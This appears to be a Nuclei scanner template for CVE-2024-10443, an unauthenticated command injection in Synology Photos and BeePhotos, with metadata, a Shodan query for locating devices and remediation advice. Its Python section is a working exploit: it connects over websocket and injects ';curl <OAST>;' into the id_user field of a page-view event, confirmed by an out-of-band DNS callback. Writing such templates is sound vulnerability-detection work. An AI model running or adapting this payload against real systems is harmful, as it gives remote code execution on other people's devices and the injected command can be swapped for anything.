code:
- engine:
  - py
  - python3
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  source: "import websocket,os,json # pip install websocket-client\nurl = \"ws://\"\
    +os.getenv('Hostname')+\"/FotoSocketIo/socket.io/?transport=websocket&EIO=4\"\n\
    ws = websocket.create_connection(url)\ninitial = ws.recv()\nws.send(\"40\")\n\
    response = ws.recv()\npayload = {\n    \"id_user\": \";curl \"+os.getenv('OAST')+\"\
    ;\",\n    \"timestamp\": 0,\n    \"location\": \"xxd\"\n}\nevent_message = f'42[\"\
    page-view\",{json.dumps(payload)}]'\nws.send(event_message)\nws.close()\n"
id: CVE-2024-10443
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:synology:photos:*:*:*:*:*:diskstation_manager:*:*
    cve-id: CVE-2024-10443
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77
    epss-percentile: 0.98689
    epss-score: 0.7214
  description: 'Improper neutralization of special elements used in a command (''Command
    Injection'') vulnerability in Task Manager component in Synology BeePhotos before
    1.0.2-10026 and 1.1.0-10053 and Synology Photos before 1.6.2-0720 and 1.7.0-0795
    allows remote attackers to execute arbitrary code via unspecified vectors.

    '
  impact: 'Remote attackers can execute arbitrary code on the system, potentially
    leading to full system compromise.

    '
  metadata:
    framework: diskstation_manager
    max-request: 1
    product: photos
    shodan-query: html:"BeeStation"
    vendor: synology
    verified: true
  name: Synology BeeStation BST150-4T - Unauthenticated Command Injection
  reference:
  - https://www.synology.com/en-us/security/advisory/Synology_SA_24_18
  remediation: 'Upgrade Synology BeePhotos to version 1.0.2-10026 or 1.1.0-10053 or
    later, and Synology Photos to version 1.6.2-0720 or 1.7.0-0795 or later.

    '
  severity: critical
  tags: unauth,synology,rce,websocket,diskstation,vuln
variables:
  OAST: '{{interactsh-url}}'
